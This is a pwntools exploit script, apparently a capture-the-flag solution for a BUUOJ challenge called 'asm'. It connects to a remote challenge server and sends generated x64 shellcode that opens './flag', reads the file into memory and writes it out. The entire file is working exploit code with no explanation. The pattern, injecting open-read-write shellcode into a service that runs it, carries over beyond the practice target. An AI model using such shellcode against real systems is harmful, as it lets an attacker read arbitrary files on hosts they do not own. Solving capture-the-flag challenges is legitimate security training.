from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('asm')
io = remote('node4.buuoj.cn', 26352)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('asm')

buf = 0x41414000
shellcode = shellcraft.open('./flag')
shellcode += shellcraft.read(3, buf, 0x40)
shellcode += shellcraft.write(1, buf, 0x40)
payload = asm(shellcode)
io.sendlineafter('give me your x64 shellcode: ', payload)
flag = io.recvline()
print(flag)
